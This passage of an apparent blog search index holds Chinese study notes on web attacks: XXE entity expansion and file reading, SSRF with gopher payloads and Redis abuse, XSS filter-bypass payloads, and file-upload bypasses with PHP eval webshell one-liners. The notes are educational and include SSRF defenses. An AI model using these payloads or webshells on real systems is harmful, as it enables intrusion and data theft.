&gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  lol6  <span class="string">&quot;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;＆lol5;&quot;</span> &gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  lol7  <span class="string">&quot;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;＆lol6;&quot;</span> &gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  lol8  <span class="string">&quot;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;＆lol7;&quot;</span> &gt; </span></span><br><span class="line"><span class="meta">&lt;!ENTITY  lol9  <span class="string">&quot;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;＆lol8;&quot;</span> &gt; </span></span><br><span class="line"><span class="meta">]&gt; </span></span><br><span class="line"><span class="meta">&lt;lolz &gt; ＆lol9; &lt;/ lolz &gt;</span></span><br></pre></td></tr></table></figure><h3 id="绕过解析错误"><a href="#绕过解析错误" class="headerlink" title="绕过解析错误"></a>绕过解析错误</h3><p>XML无法解析含<code>&lt;&gt;</code>的内容(无法与标签区分),所以需要用CDATA标签处理</p><p>且根据语法限制需要利用参数实体拼接字符,例如读取<code>etc/fstab</code>文件内容(含有类似标签的注释内容):</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/fstab&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">start</span> <span class="string">&quot;&lt;![CDATA[&quot;</span>&gt;</span> </span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">end</span> <span class="string">&quot;]]&gt;&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">wrapper</span> <span class="string">&quot;&lt;!ENTITY all &#x27;%start;%file;%end;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%wrapper;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-SSRF(服务器端请求伪造)</title>
      <link href="/2024/02/08/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-SSRF/"/>
      <url>/2024/02/08/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-SSRF/</url>
      
        <content type="html"><![CDATA[<h2 id="1-漏洞函数-php"><a href="#1-漏洞函数-php" class="headerlink" title="1.漏洞函数(php)"></a>1.漏洞函数(php)</h2><p><code>file_get_contents()、fsockopen()、curl_exec()、fopen()、readfile()</code><br>接下来详细介绍其中几种函数:</p><ul><li>curl_exec()</li></ul><p>curl_exec函数用于执行指定的cURL会话</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$link</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">    <span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();<span class="comment">// 创建新的 cURL 资源</span></span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>,CURLOPT_URL,<span class="variable">$link</span>);</span><br><span class="line">    <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);<span class="comment">// 设置 URL 和相应的选项</span></span><br><span class="line">    <span class="variable">$result</span>=<span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);<span class="comment">// 抓取 URL 并把它传递给浏览器</span></span><br><span class="line">    <span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);<span class="comment">// 关闭 cURL 资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line">    <span class="variable">$filename</span> = <span class="string">&#x27;./curled/&#x27;</span>.<span class="title function_ invoke__">rand</span>().<span class="string">&#x27;.txt&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="variable">$result</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>fsockopen()</li></ul><p>函数实现对用户指定url数据的获取，该函数使用socket（端口）跟服务器建立tcp连接，传输数据。变量host为主机名，port为端口，errstr表示错误信息将以字符串的信息返回，30为时限</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">GetFile</span>(<span class="params"><span class="variable">$host</span>,<span class="variable">$port</span>,<span class="variable">$link</span></span>) </span>&#123; </span><br><span class="line">    <span class="variable">$fp</span> = <span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="title function_ invoke__">intval</span>(<span class="variable">$port</span>), <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);   </span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$fp</span>) &#123; </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (error number <span class="subst">$errno</span>) \n&quot;</span>; </span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="variable">$out</span> = <span class="string">&quot;GET <span class="subst">$link</span> HTTP/1.1\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;Connection: Close\r\n\r\n&quot;</span>; </span><br><span class="line">        <span class="variable">$out</span> .= <span class="string">&quot;\r\n&quot;</span>; </span><br><span class="line">        <span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>); </span><br><span class="line">        <span class="variable">$contents</span>=<span class="string">&#x27;&#x27;</span>; </span><br><span class="line">        <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123; </span><br><span class="line">            <span class="variable">$contents</span>.= <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">1024</span>); </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>); </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$contents</span>; </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>file_get_contents()</li></ul><p>file_get_content函数从用户指定的url获取内容，然后指定一个文件名j进行保存，并展示给用户。file_put_content函数把一个字符串写入文件中。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>注</strong>:</p><ol><li>一般情况下PHP不会开启fopen的gopher wrapper</li><li><code>file_get_contents()</code>的gopher协议不能URL编码</li><li><code>file_get_contents()</code>关于Gopher的302跳转会出现bug，导致利用失败</li><li><code>curl/libcurl</code> 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用</li><li><code>curl_exec()</code> 默认不跟踪跳转，</li><li><code>file_get_contents()</code>支持php:&#x2F;&#x2F;input协议</li></ol><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><p><img src="https://img2020.cnblogs.com/blog/1423858/202010/1423858-20201031183029092-1483142120.png" alt="1"></p><h3 id="file伪协议"><a href="#file伪协议" class="headerlink" title="file伪协议"></a>file伪协议</h3><p>在有回显的情况下，利用 file 协议可以读取任意内容</p><h3 id="dict伪协议"><a href="#dict伪协议" class="headerlink" title="dict伪协议"></a>dict伪协议</h3><p>泄露安装软件版本信息，查看端口，操作内网redis服务等</p><h3 id="http伪协议"><a href="#http伪协议" class="headerlink" title="http伪协议"></a>http伪协议</h3><p>探测内网主机存活或目录扫描</p><h3 id="gopher伪协议"><a href="#gopher伪协议" class="headerlink" title="gopher伪协议"></a>gopher伪协议</h3><p>可以选择利用工具Gopherus快捷生成payload: <a href="https://github.com/tarunkant/Gopherus">https://github.com/tarunkant/Gopherus</a></p><p>gopher支持发出GET、POST请求：可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。可用于反弹shell</p><p>默认端口为70,格式为<code>gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</code></p><p>gopher伪协议不转发<code>&lt;gopher-path&gt;</code>内第一个字符,可以使用下划线填充首位</p><hr><ul><li>GET提交</li></ul><p>需要保留数据包中的头部信息,例如:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/name.php?name=123</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.250.250.4</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>注</strong>:其中最后需要保留一个<code>换行符</code>(多出一行空行)表示消息结束</p><p>接下来将数据包内的内容复制,并将特殊字符(空格 问号 换行符)进行url编码利用gopher伪协议构造好</p><p>payload(需在网页中提交,若在bp中发包需要进行两次url编码):</p><p><strong>gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_GET<code>%20</code>&#x2F;name.php<code>%3f</code>name&#x3D;123<code>%20</code>HTTP&#x2F;1.1<code>%0d%0A</code>Host:<code>%20</code>172.250.250.4<code>%0d%0A</code></strong></p><ul><li>POST提交</li></ul><p>需要保留数据包中的头部信息,例如:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/name.php</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>172.250.250.4</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>8</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">name</span><span class="operator">=</span><span class="number">123</span></span></span><br></pre></td></tr></table></figure><p><strong>注</strong>:其中的<code>Content-Length</code>要与提交内容长短对应</p><p>接下来将数据包内的内容进行两次url编码(所有字符),拼接在<code>_</code>后构造好gopher伪协议提交</p><p>payload:</p><p>gopher:&#x2F;&#x2F;172.250.250.4:80&#x2F;_<code>%25%35%30%25%34%66%25%35%33%25%35%34%25%32%30%25%32%66%25%36%65%25%36%31%25%36%64%25%36%35%25%32%65%25%37%30%25%36%38%25%37%30%25%32%30%25%34%38%25%35%34%25%35%34%25%35%30%25%32%66%25%33%31%25%32%65%25%33%31%25%30%64%25%30%61%25%34%38%25%36%66%25%37%33%25%37%34%25%33%61%25%32%30%25%33%31%25%33%37%25%33%32%25%32%65%25%33%32%25%33%35%25%33%30%25%32%65%25%33%32%25%33%35%25%33%30%25%32%65%25%33%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%35%34%25%37%39%25%37%30%25%36%35%25%33%61%25%32%30%25%36%31%25%37%30%25%37%30%25%36%63%25%36%39%25%36%33%25%36%31%25%37%34%25%36%39%25%36%66%25%36%65%25%32%66%25%37%38%25%32%64%25%37%37%25%37%37%25%37%37%25%32%64%25%36%36%25%36%66%25%37%32%25%36%64%25%32%64%25%37%35%25%37%32%25%36%63%25%36%35%25%36%65%25%36%33%25%36%66%25%36%34%25%36%35%25%36%34%25%30%64%25%30%61%25%34%33%25%36%66%25%36%65%25%37%34%25%36%35%25%36%65%25%37%34%25%32%64%25%34%63%25%36%35%25%36%65%25%36%37%25%37%34%25%36%38%25%33%61%25%32%30%25%33%38%25%30%64%25%30%61%25%30%64%25%30%61%25%36%65%25%36%31%25%36%64%25%36%35%25%33%64%25%33%31%25%33%32%25%33%33</code></p><h3 id="SSRF打Redis"><a href="#SSRF打Redis" class="headerlink" title="SSRF打Redis"></a>SSRF打Redis</h3><p>利用SSRF发现内网开放6379端口,则可能存在Redis服务<br>此时如果目标主机上的Redis由于没有设置密码认证、没有进行添加防火墙等原因存在未授权访问漏洞的话，那我们就可以利用Gopher协议远程操纵目标主机上的Redis，可以利用 Redis 自身的提供的<code>config</code>命令像目标主机写WebShell、写SSH公钥、创建计划任务反弹Shell等</p><h3 id="SSRF打MySQL"><a href="#SSRF打MySQL" class="headerlink" title="SSRF打MySQL"></a>SSRF打MySQL</h3><h3 id="SSRF打tomcat"><a href="#SSRF打tomcat" class="headerlink" title="SSRF打tomcat"></a>SSRF打tomcat</h3><h2 id="3-绕过方式"><a href="#3-绕过方式" class="headerlink" title="3.绕过方式"></a>3.绕过方式</h2><h3 id="回环地址绕过-二进制IP"><a href="#回环地址绕过-二进制IP" class="headerlink" title="回环地址绕过(二进制IP)"></a>回环地址绕过(二进制IP)</h3><p>可以用不同进制表示IP地址</p><p><img src="https://s2.loli.net/2024/02/20/IcQVejfq369xg7w.png" alt="image.png"></p><h3 id="302重定向绕过"><a href="#302重定向绕过" class="headerlink" title="302重定向绕过"></a>302重定向绕过</h3><h3 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h3><p><img src="https://s2.loli.net/2024/02/20/Jn2Ivzh3XRcqO8P.png" alt="image.png"></p><p>利用此网站生成重绑定地址:<a href="http://lock.cmpxchg8b.com/rebinder.html">http://lock.cmpxchg8b.com/rebinder.html</a></p><h3 id="短网址绕过"><a href="#短网址绕过" class="headerlink" title="短网址绕过"></a>短网址绕过</h3><p>利用此网站生成短网址:<a href="https://suowo.cn/">https://suowo.cn</a></p><h3 id="点分符号替换"><a href="#点分符号替换" class="headerlink" title="点分符号替换"></a>点分符号替换</h3><p>例如<code>http://www。qq。com</code></p><h2 id="4-漏洞防御"><a href="#4-漏洞防御" class="headerlink" title="4.漏洞防御"></a>4.漏洞防御</h2><ul><li><p>禁止302跳转，或者每跳转一次都进行校验目的地址是否为内网地址或合法地址。</p></li><li><p>过滤返回信息，验证远程服务器对请求的返回结果，是否合法。</p></li><li><p>禁用高危协议，例如：gopher、dict、ftp、file等，只允许http&#x2F;https。</p></li><li><p>设置URL白名单或者限制内网IP。</p></li><li><p>限制请求的端口为http的常用端口，或者根据业务需要开放远程调用服务的端口。</p></li><li><p>catch错误信息，做统一错误信息，避免黑客通过错误信息判断端口对应的服务。</p></li></ul><h2 id="部分内容参考资料"><a href="#部分内容参考资料" class="headerlink" title="部分内容参考资料"></a>部分内容参考资料</h2><p><a href="https://www.cnblogs.com/miruier/p/13907150.html">https://www.cnblogs.com/miruier/p/13907150.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-XSS(跨站脚本攻击)</title>
      <link href="/2024/02/07/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-XSS/"/>
      <url>/2024/02/07/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-XSS/</url>
      
        <content type="html"><![CDATA[<h2 id="1-反射型"><a href="#1-反射型" class="headerlink" title="1.反射型"></a>1.反射型</h2><p>用户如果点击了类似于这样的攻击型url,就会执行反射型XSS攻击,并造成危害,这也就是它作为反射型的原因,且只会执行一次</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/xss.<span class="property">php</span>?id=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"><span class="title function_">alert</span>(<span class="string">&quot;hello&quot;</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><h2 id="2-储存型"><a href="#2-储存型" class="headerlink" title="2.储存型"></a>2.储存型</h2><p>存储型一般会在博客评论，用户评论，留言板等等这些会把数据存储在数据库中的地方注入恶意代码</p><p>作为用户来访问此网页时触发</p><h2 id="3-DOM型"><a href="#3-DOM型" class="headerlink" title="3.DOM型"></a>3.DOM型</h2><p>详解:<a href="https://www.cnblogs.com/mysticbinary/p/12542695.html">https://www.cnblogs.com/mysticbinary/p/12542695.html</a></p><p>重定向至京东页面:</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">onload</span>=<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line"><span class="keyword">var</span> link=<span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line"><span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;=link.<span class="property">length</span>;j++)&#123;</span><br><span class="line">link[j].<span class="property">href</span>=<span class="string">&quot;https://www.jd.com&quot;</span>;&#125;</span><br><span class="line">&#125;&lt;/script&gt;</span><br></pre></td></tr></table></figure><h2 id="4-一些常见绕过"><a href="#4-一些常见绕过" class="headerlink" title="4.一些常见绕过"></a>4.一些常见绕过</h2><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">只过滤了<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-handlebars"><span class="language-xml">标签,可以尝试<span class="tag">&lt;<span class="name">scRipt</span>&gt;</span>绕过</span></span></span><br></pre></td></tr></table></figure><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>遇到替换为空或删除的情况,可以尝试</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scri&lt;script&gt;pt&gt;</span><br></pre></td></tr></table></figure><h3 id="替换绕过-HTML事件或js伪协议"><a href="#替换绕过-HTML事件或js伪协议" class="headerlink" title="替换绕过(HTML事件或js伪协议)"></a>替换绕过(HTML事件或js伪协议)</h3><p>详细:<a href="https://www.cnblogs.com/xiaozi/p/12050521.html">https://www.cnblogs.com/xiaozi/p/12050521.html</a></p><p>这里举几个常用的例子:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span> <span class="comment">&lt;!--加载svg图片时执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span> <span class="comment">&lt;!--通过js伪协议执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">onmouseover</span>=<span class="string">alert(document.cookie)</span>&gt;</span>xxs link<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--光标移动到xss link超链接上执行js代码&quot;alert(document.cookie)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span> <span class="comment">&lt;!--点击link超链接通过js伪协议执行js代码&quot;alert(1)&quot;--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">x</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">1</span>&#x27;)&gt;</span><span class="tag">&lt;/<span class="name">img</span>&gt;</span> <span class="comment">&lt;!--通过故意引用不存在的图片触发onerror命令执行js代码&quot;alert(1)&quot;--&gt;</span></span><br></pre></td></tr></table></figure><h3 id="HTML实体编码绕过"><a href="#HTML实体编码绕过" class="headerlink" title="HTML实体编码绕过"></a>HTML实体编码绕过</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x61;&amp;#x6c;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>也可以不带分号</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&amp;#x6a&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3a&amp;#x61&amp;#x6c&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x31&amp;#x29</span>&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>网页中显示空格可以用<code>&amp;nbsp;</code><br>也可以用实体编码<code>&amp;#x20;</code></p><h3 id="内嵌tab"><a href="#内嵌tab" class="headerlink" title="内嵌tab"></a>内嵌tab</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">java&amp;#x09;script:alert(1)</span>&gt;</span></span><br></pre></td></tr></table></figure><p>防止javascrpt被过滤掉</p><h3 id="css特性绕过"><a href="#css特性绕过" class="headerlink" title="css特性绕过"></a>css特性绕过</h3><p>background:url(javascript:)</p><h3 id="拼接绕过"><a href="#拼接绕过" class="headerlink" title="拼接绕过"></a>拼接绕过</h3><p><code>window[&quot;al&quot;+&quot;ert&quot;](&quot;Hello, world!&quot;);</code></p><p>和<code>&lt;script&gt;alert(/Hello, world!/)&lt;/script&gt;</code>效果一样</p><h3 id="长度限制绕过"><a href="#长度限制绕过" class="headerlink" title="长度限制绕过"></a>长度限制绕过</h3><h2 id="5-XSS平台"><a href="#5-XSS平台" class="headerlink" title="5.XSS平台"></a>5.XSS平台</h2><p>利用:<a href="https://blog.csdn.net/NSQ0207/article/details/131891269">https://blog.csdn.net/NSQ0207/article/details/131891269</a></p>]]></content>
      
      
      <categories>
          
          <category> 知识点 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web安全-文件上传</title>
      <link href="/2024/02/07/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-upload/"/>
      <url>/2024/02/07/%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93-web%E5%AE%89%E5%85%A8-upload/</url>
      
        <content type="html"><![CDATA[<h2 id="前端检测"><a href="#前端检测" class="headerlink" title="前端检测"></a>前端检测</h2><p>查看网络，被拦截时是否发包，若有前端检测，可以进行抓包改包绕过或者禁用js上传</p><h2 id="MIME类型检测"><a href="#MIME类型检测" class="headerlink" title="MIME类型检测"></a>MIME类型检测</h2><p>修改请求包中的Content-Type，改为图片的类型image&#x2F;jpeg、image&#x2F;png、image&#x2F;gif等是否能通过</p><h2 id="黑名单绕过"><a href="#黑名单绕过" class="headerlink" title="黑名单绕过"></a>黑名单绕过</h2><h3 id="后缀名绕过"><a href="#后缀名绕过" class="headerlink" title="后缀名绕过"></a>后缀名绕过</h3><p>尝试.phtml、.pht、.php3、.php4、.php5等后缀</p><h3 id="变种木马-phtml、-pht文件"><a href="#变种木马-phtml、-pht文件" class="headerlink" title="变种木马(.phtml、.pht文件)"></a>变种木马(.phtml、.pht文件)</h3><p>.phtml、.pht文件可以这样写</p><ul><li><p>短标签:<code>&lt;?=@eval($_POST[&#39;shell&#39;]);?&gt;</code></p></li><li><p>HTML标签形式:<code>&lt;script language=&quot;php&quot;&gt; eval($_POST[&#39;shell&#39;]);echo phpinfo();&lt;/script&gt;</code></p></li></ul><h3 id="htaccess文件"><a href="#htaccess文件" class="headerlink" title=".htaccess文件"></a>.htaccess文件</h3><p>上传后，所在目录中名字包含png的文件将被当作php代码解析。（只支持apache服务器）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="title class_">FilesMatch</span> <span class="string">&quot;png&quot;</span>&gt; setHander application/x-httpd-php &lt;/<span class="title class_">FilesMatch</span>&gt;</span><br></pre></td></tr></table></figure><h3 id="user-ini文件"><a href="#user-ini文件" class="headerlink" title=".user.ini文件"></a>.user.ini文件</h3><p>条件:</p><ol><li><p>服务器脚本语言为PHP  </p></li><li><p>服务器使用CGI／FastCGI模式  </p></li><li><p>上传目录下要有可执行的php文件</p></li></ol><p>文件内容:<code>auto_prepend_file = shell.jpg</code></p><p>意思是：所有的php文件都自动包含shell.jpg文件</p><p>那么我们传入一个一句话木马并改后缀为jpg的文件,就可以通过.user.ini文件,利用后台存在的php文件使这个.jpg的shell文件直接执行</p><h3 id="双写绕过"><a href="#双写绕过" class="headerlink" title="双写绕过"></a>双写绕过</h3><p>对于后台替换一次后缀名可以构造<code>.phphpp</code>后缀,替换为空后为<code>.php</code></p><h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>对于后台缺少转换统一大小写的功能,可以对后缀名大小写绕过,例如:<code>.pHP</code></p><h3 id="特性利用绕过"><a href="#特性利用绕过" class="headerlink" title="特性利用绕过"></a>特性利用绕过</h3><ol><li><p>利用windows文件系统特性，文件后缀添加<code>.</code>,例如<code>.php.</code>。(目的是后缀名后多加点后可以绕过后台检测,而windows特性会将文件后缀不合法字符清除),同理加<code>空格</code>也可以<br>若不通过，可能利用了str_ireplace()进行了去除，添加<code>. .</code></p></li><li></li></ol><ul><li>利用%00或0x00截断(windows系统本质是c语言编写,解析遇到%00,即空字符,会直接忽略之后内容)save_path,例如修改数据包第一行为:<code>GET index.php?save_path=../upload/shell.php%00 HTTP/1.1</code><br>并且将filename改为<code>filename=&quot;shell.jpg&quot;</code>(绕过后台检测),而截断是为了去掉系统生成的路径防止路径出错</li><li>而在POST请求提交路径值,需要在数据包中直接修改成空字符的Hex值,例如<code>../upload/shell.php+</code>,其中利用<code>+</code>占位,然后在burpsuite中将占位符的Hex值修改为00(空字符)</li></ul><p>3.利用文件系统的漏洞，在文件后缀最后添加<code>::$DATA</code>当做数据流（一般windows可用），如果有str_ireplace进行了去除，那么添加<code>::$DA::$DATATA</code>(双写)</p><h2 id="白名单绕过"><a href="#白名单绕过" class="headerlink" title="白名单绕过"></a>白名单绕过</h2><h3 id="图片马绕过"><a href="#图片马绕过" class="headerlink" 